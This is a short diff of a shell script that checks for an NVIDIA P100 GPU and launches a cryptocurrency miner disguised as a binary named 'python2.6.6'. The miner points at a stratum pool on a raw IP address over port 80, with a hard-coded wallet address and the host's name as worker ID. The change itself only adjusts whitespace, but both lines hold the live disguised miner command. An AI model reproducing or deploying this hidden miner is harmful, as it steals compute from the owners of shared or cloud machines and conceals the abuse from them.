@@ -18,5 +18,5 @@ if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
     ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384
 else
-    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128
+    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384 --cl-local-work 128
 fi
